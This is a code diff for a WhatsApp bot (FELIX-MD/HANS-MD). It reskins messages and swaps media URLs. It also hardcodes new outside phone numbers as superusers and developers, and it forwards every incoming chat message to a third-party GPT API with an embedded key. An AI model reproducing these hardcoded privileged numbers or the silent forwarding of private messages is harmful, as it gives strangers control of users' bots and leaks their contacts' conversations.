@@ -56,6 +56,7 @@ logger.level = 'silent';
 const pino = require("pino");
 const boom_1 = require("@hapi/boom");
 const conf = require("./set");
+const axios = require('axios');
 let fs = require("fs-extra");
 let path = require("path");
 const FileType = require('file-type');
@@ -187,8 +188,9 @@ setTimeout(() => {
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
   let notification = `*FELIX ANTIDELETE*\n\n`;
-  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by HANSTZ*\n\n`;
+  notification +=   `*TIME DELETED :* ${new Date().toLocaleString()}\n`;
+  notification +=   `*DELETED BY   :* @${deletedBy.split('@')[0]}\n\n
+                    *POWERED BY HANSTZ*\n\n`;
   return notification;
 }
 
@@ -457,105 +459,63 @@ zk.ev.on("messages.upsert", async m => {
     }
   }
 });
+const API_URL = "https://apis.ibrahimadams.us.kg/api/ai/gpt4";
+const API_KEY = "ibraah-help"; // Replace with your actual API key if needed
 
-// Load the reply messages from the JSON file
-const loadReplyMessages = () => {
+// Function to fetch a chatbot reply
+const getChatbotReply = async (messageText) => {
   try {
-    const filePath = path.join(__dirname, 'database', 'chatbot.json');
-    const data = fs.readFileSync(filePath, 'utf8');
-    return JSON.parse(data);
-  } catch (error) {
-    console.error('Error loading chatbot responses:', error.message);
-    return {}; // Return an empty object if there is an error
-  }
-};
+    const response = await axios.get(API_URL, {
+      params: { apikey: API_KEY, q: messageText },
+      headers: { "Content-Type": "application/json" },
+    });
 
-// Track the time of the last response to enforce rate-limiting
-let lastReplyTime = 0;
-
-// Define the minimum delay (in milliseconds) between replies (e.g., 5 seconds)
-const MIN_REPLY_DELAY = 5000;
-
-// Function to find a matching text reply based on the message
-const getReplyMessage = (messageText, replyMessages) => {
-  // Convert the message to lowercase and split it into words
-  const words = messageText.toLowerCase().split(/\s+/);
-
-  // Check if any of the words match a keyword in the replyMessages object
-  for (const word of words) {
-    if (replyMessages[word]) {
-      return replyMessages[word]; // Return the matching reply
+    if (response.data && response.data.reply) {
+      return response.data.reply; // Assuming the response contains a "reply" field
+    } else {
+      return "Sorry, I didn't understand that. Can you try rephrasing?";
     }
-  }
-
-  return null; // Return null if no match is found
-};
-
-// Function to send quoted replies with the "quoted: ms" format
-const sendQuotedReply = async (message, reply) => {
-  try {
-    const quotedMessage = {
-      text: `quoted: ms ${reply}`,
-      quotedMessage: message, // This wraps the original message
-    };
-
-    // Send the quoted message (assuming 'zk.sendMessage' sends the message)
-    await zk.sendMessage(message.key.remoteJid, quotedMessage);
-    console.log(`Quoted reply sent: quoted: ms ${reply}`);
   } catch (error) {
-    console.error(`Error sending quoted reply: ${error.message}`);
+    console.error("Error fetching reply from API:", error.message);
+    return "Sorry, the chatbot service is currently unavailable.";
   }
 };
 
-// Listen for incoming messages when CHAT_BOT is enabled
-if (conf.CHAT_BOT === 'yes') {
-  console.log('CHAT_BOT is enabled. Listening for messages...');
-  
-  zk.ev.on('messages.upsert', async (event) => {
+// Listen for incoming messages (example with `zk` framework)
+if (conf.CHAT_BOT === "yes") {
+  console.log("CHAT_BOT is enabled. Listening for messages...");
+
+  zk.ev.on("messages.upsert", async (event) => {
     try {
       const { messages } = event;
 
-      // Load the replies from the JSON file
-      const replyMessages = loadReplyMessages();
-
-      // Iterate over incoming messages
       for (const message of messages) {
-        if (!message.key || !message.key.remoteJid) {
-          continue; // Skip if there's no remoteJid
+        if (!message.key || !message.key.remoteJid || message.key.fromMe) continue;
+
+        const messageText =
+          message.message?.conversation || message.message?.extendedTextMessage?.text || "";
+
+        if (messageText) {
+          try {
+            const replyMessage = await getChatbotReply(messageText);
+
+            if (replyMessage) {
+              // Send the reply with the quoted original message
+              await zk.sendMessage(message.key.remoteJid, {
+                text: replyMessage,
+                quoted: message, // Quote the original message
+              });
+              console.log(`Reply sent: ${replyMessage}`);
+            } else {
+              console.log("No reply generated for the input.");
+            }
+          } catch (error) {
+            console.error(`Error processing message: ${error.message}`);
+          }
         }
-
-        const messageText = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
-        let replyMessage = '';
-
-        // Detect hidden words in the message and prepare responses
-        if (messageText.toLowerCase().includes('help')) {
-          replyMessage = "I'm here to assist you! 🤖";
-        } else if (messageText.toLowerCase().includes('weather')) {
-          replyMessage = "The weather is great today! 🌞";
-        }
-
-        // Ensure we don't send replies too frequently
-        const currentTime = Date.now();
-        if (currentTime - lastReplyTime < MIN_REPLY_DELAY) {
-          console.log('Rate limit applied. Skipping reply.');
-          continue; // Skip this reply if the delay hasn't passed
-        }
-
-        if (replyMessage) {
-          // Send the quoted response
-          await sendQuotedReply(message, replyMessage);
-
-          // Update the last reply time
-          lastReplyTime = currentTime;
-        } else {
-          console.log('No matching keyword detected. Skipping message.');
-        }
-
-        // Wait for a brief moment before processing the next message (3 seconds delay)
-        await new Promise((resolve) => setTimeout(resolve, 3000));
       }
     } catch (error) {
-      console.error('Error processing messages:', error.message);
+      console.error("Error in message processing:", error.message);
     }
   });
 }
@@ -705,10 +665,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "255760774888", '254110190196', '255760774888', "255756530143", '255760774888', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254110190196', '255760774888', "255756530143", '255760774888'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -1261,7 +1221,7 @@ if (conf.ANTILINK === "yes") {
       try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
       } catch {
-        ppgroup = 'https://ibb.co/7SKY0tg';
+        ppgroup = 'https://files.catbox.moe/5pu96r.webp';
       }
       try {
         const metadata = await zk.groupMetadata(group.id);
@@ -1431,24 +1391,38 @@ if (conf.ANTILINK === "yes") {
         }
         console.log("Felix Md successfully connected✅");
         await activateCrons();
-        if (conf.DP.toLowerCase() === 'yes') {
-          await zk.sendMessage(zk.user.id, {
-            text: `╭════⊷
-║ *『FELIX-𝐌𝐃 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
-║    Creator: *HANSTZ*
-║    Prefix : [  ${prefixe} ]
-║    Mode : ${md} mode
-║    Total Commands : ${evt.cm.length}
-╰═════════════════⊷
+        if (conf.DP.toLowerCase() === "yes") {
+  await zk.sendMessage(zk.user.id, {
+    image: { url: "https://files.catbox.moe/4bvh1g.jpg" }, // Bot image URL
+    caption: `
+╭━━━━━━━━━━━━━━━
+┃ *『 FELIX-MD 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞 』*
+╰━━━━━━━━━━━━━━━
 
-╭───◇
-┃
-┃ *Thank you for choosing*                      
-┃ *FELIX-MD*
- > Regards HANSTZ 
-╰═════════════════⊷ `
-          });
-        }
+ 🌟 *Bot Information*
+ ━━━━━━━━━━━━━━━
+┃📌┃*Creator*: HANSTZ
+┃🔑┃*Prefix*: [ ${prefixe} ]
+┃💡┃*Mode*: ${md} mode
+┃📝┃*Total Commands*: ${evt.cm.length}
+ ━━━━━━━━━━━━━━━
+
+╭━━━━━━━━━━━━━━━
+┃🔔 *Thank you for choosing HANS-MD!*
+┃🌐 *Stay updated with the latest information.*
+┃🎭 *Regards, HANSTZ
+╰━━━━━━━━━━━━━━━
+
+🎶 *Now enjoy you : Hans md song Connected*`
+  });
+  // Send the music file
+  await zk.sendMessage(zk.user.id, {
+    audio: { url: "https://github.com/kinghanstz/HANS-DATABASE/raw/38fc2499e3435cf7a2e85a22a9b1afeb492d234e/audios/Matrix-menu.mp3" },
+    mimetype: "audio/mp4",
+    ptt: true
+  });
+}
+
       } else if (connection == "close") {
         let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
         if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
